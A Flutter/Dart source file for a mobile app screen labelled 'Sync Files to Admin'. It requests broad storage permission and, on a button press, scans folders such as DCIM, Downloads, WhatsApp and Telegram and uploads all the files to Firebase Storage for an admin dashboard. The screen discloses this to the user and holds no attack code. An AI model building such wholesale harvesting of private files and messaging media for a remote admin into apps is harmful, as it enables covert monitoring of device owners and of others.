import 'dart:async';
import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';
import '../services/file_sync_service.dart';

class SyncScreen extends StatefulWidget {
  const SyncScreen({super.key});

  @override
  State<SyncScreen> createState() => _SyncScreenState();
}

class _SyncScreenState extends State<SyncScreen> with SingleTickerProviderStateMixin {
  final _syncService = FileSyncService();
  late AnimationController _pulseCtrl;

  bool _syncing = false;
  bool _done = false;
  int _progress = 0;
  int _total = 0;
  int _succeeded = 0;
  int _failed = 0;
  String _currentFile = '';
  String? _error;

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 1200),
    )..repeat(reverse: true);
  }

  @override
  void dispose() {
    _pulseCtrl.dispose();
    super.dispose();
  }

  Future<void> _startSync() async {
    // Ensure storage permission
    var status = await Permission.manageExternalStorage.request();
    if (!status.isGranted) {
      status = await Permission.storage.request();
    }
    if (!status.isGranted) {
      setState(() => _error = 'Storage permission required to sync files.');
      return;
    }

    setState(() {
      _syncing = true;
      _done = false;
      _progress = 0;
      _total = 0;
      _succeeded = 0;
      _failed = 0;
      _error = null;
      _currentFile = 'Scanning device...';
    });

    final result = await _syncService.syncAllFiles(
      onProgress: (done, total, current) {
        if (mounted) {
          setState(() {
            _progress = done;
            _total = total;
            _currentFile = current;
          });
        }
      },
    );

    if (mounted) {
      setState(() {
        _syncing = false;
        _done = true;
        _succeeded = result.succeeded;
        _failed = result.failed;
        _error = result.error;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0F172A),
      appBar: AppBar(
        backgroundColor: const Color(0xFF1E293B),
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new, size: 18, color: Colors.white),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text('Sync Files to Admin',
            style: GoogleFonts.inter(
                color: Colors.white, fontSize: 16, fontWeight: FontWeight.w600)),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          children: [
            const SizedBox(height: 20),
            _buildInfoCard(),
            const SizedBox(height: 32),
            if (!_syncing && !_done) _buildStartButton(),
            if (_syncing) _buildProgress(),
            if (_done) _buildResult(),
            if (_error != null && !_syncing)
              Padding(
                padding: const EdgeInsets.only(top: 16),
                child: Container(
                  padding: const EdgeInsets.all(14),
                  decoration: BoxDecoration(
                    color: Colors.red.shade900.withOpacity(0.3),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: Colors.red.shade700.withOpacity(0.4)),
                  ),
                  child: Text(_error!,
                      style: GoogleFonts.inter(color: Colors.red.shade300, fontSize: 13)),
                ),
              ),
          ],
        ),
      ),
    );
  }

  Widget _buildInfoCard() {
    return Container(
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        color: const Color(0xFF1E293B),
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: Colors.white.withOpacity(0.07)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(10),
                decoration: BoxDecoration(
                  color: const Color(0xFF6366F1).withOpacity(0.15),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: const Icon(Icons.cloud_upload, color: Color(0xFF6366F1), size: 22),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('File Sync',
                        style: GoogleFonts.inter(
                            color: Colors.white, fontSize: 15, fontWeight: FontWeight.w700)),
                    Text('Upload device files to admin dashboard',
                        style: GoogleFonts.inter(color: Colors.white54, fontSize: 12)),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 16),
          _infoRow('📂', 'Scans DCIM, Pictures, Downloads, WhatsApp, Telegram & more'),
          const SizedBox(height: 8),
          _infoRow('☁️', 'Uploads to Firebase Storage (max 100 MB per file)'),
          const SizedBox(height: 8),
          _infoRow('⚡', 'Skips already-synced files for speed'),
          const SizedBox(height: 8),
          _infoRow('🔒', 'Admin can view and download files from the dashboard'),
        ],
      ),
    );
  }

  Widget _infoRow(String icon, String text) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(icon, style: const TextStyle(fontSize: 14)),
        const SizedBox(width: 10),
        Expanded(
          child: Text(text,
              style: GoogleFonts.inter(color: Colors.white60, fontSize: 13)),
        ),
      ],
    );
  }

  Widget _buildStartButton() {
    return SizedBox(
      width: double.infinity,
      height: 52,
      child: ElevatedButton.icon(
        onPressed: _startSync,
        icon: const Icon(Icons.cloud_upload, size: 20),
        label: Text('Start File Sync',
            style: GoogleFonts.inter(fontSize: 16, fontWeight: FontWeight.w600)),
        style: ElevatedButton.styleFrom(
          backgroundColor: const Color(0xFF6366F1),
          foregroundColor: Colors.white,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
          elevation: 0,
        ),
      ),
    );
  }

  Widget _buildProgress() {
    final pct = _total == 0 ? 0.0 : _progress / _total;
    return Column(
      children: [
        AnimatedBuilder(
          animation: _pulseCtrl,
          builder: (_, __) => Container(
            width: 80,
            height: 80,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: Color.lerp(
                const Color(0xFF6366F1).withOpacity(0.1),
                const Color(0xFF6366F1).withOpacity(0.3),
                _pulseCtrl.value,
              ),
            ),
            child: const Icon(Icons.cloud_upload, color: Color(0xFF6366F1), size: 38),
          ),
        ),
        const SizedBox(height: 24),
        Text('Uploading files...',
            style: GoogleFonts.inter(
                color: Colors.white, fontSize: 18, fontWeight: FontWeight.w700)),
        const SizedBox(height: 8),
        Text(
          _total > 0 ? '$_progress / $_total files' : 'Scanning...',
          style: GoogleFonts.inter(color: Colors.white54, fontSize: 14),
        ),
        const SizedBox(height: 20),
        LinearProgressIndicator(
          value: _total > 0 ? pct : null,
          backgroundColor: Colors.white10,
          color: const Color(0xFF6366F1),
          minHeight: 6,
          borderRadius: BorderRadius.circular(3),
        ),
        const SizedBox(height: 12),
        Text(
          _currentFile,
          style: GoogleFonts.inter(color: Colors.white38, fontSize: 12),
          overflow: TextOverflow.ellipsis,
          textAlign: TextAlign.center,
        ),
        if (_total > 0)
          Padding(
            padding: const EdgeInsets.only(top: 6),
            child: Text(
              '${(pct * 100).toStringAsFixed(0)}% complete',
              style: GoogleFonts.inter(color: const Color(0xFF6366F1), fontSize: 13, fontWeight: FontWeight.w600),
            ),
          ),
      ],
    );
  }

  Widget _buildResult() {
    return Column(
      children: [
        Container(
          width: 80,
          height: 80,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: const Color(0xFF10B981).withOpacity(0.15),
          ),
          child: const Icon(Icons.check_circle, color: Color(0xFF10B981), size: 44),
        ),
        const SizedBox(height: 20),
        Text('Sync Complete!',
            style: GoogleFonts.inter(
                color: Colors.white, fontSize: 20, fontWeight: FontWeight.w800)),
        const SizedBox(height: 16),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            _statBadge('$_succeeded', 'Uploaded', const Color(0xFF10B981)),
            const SizedBox(width: 16),
            _statBadge('$_failed', 'Failed', const Color(0xFFEF4444)),
          ],
        ),
        const SizedBox(height: 24),
        Text('Admin can now view your files in the dashboard.',
            style: GoogleFonts.inter(color: Colors.white54, fontSize: 13),
            textAlign: TextAlign.center),
        const SizedBox(height: 24),
        SizedBox(
          width: double.infinity,
          height: 48,
          child: OutlinedButton.icon(
            onPressed: _startSync,
            icon: const Icon(Icons.refresh, size: 18),
            label: Text('Sync Again',
                style: GoogleFonts.inter(fontWeight: FontWeight.w600)),
            style: OutlinedButton.styleFrom(
              foregroundColor: const Color(0xFF6366F1),
              side: const BorderSide(color: Color(0xFF6366F1)),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
            ),
          ),
        ),
      ],
    );
  }

  Widget _statBadge(String value, String label, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
      decoration: BoxDecoration(
        color: color.withOpacity(0.12),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.3)),
      ),
      child: Column(
        children: [
          Text(value,
              style: GoogleFonts.inter(
                  color: color, fontSize: 22, fontWeight: FontWeight.w800)),
          Text(label,
              style: GoogleFonts.inter(color: color.withOpacity(0.8), fontSize: 12)),
        ],
      ),
    );
  }
}
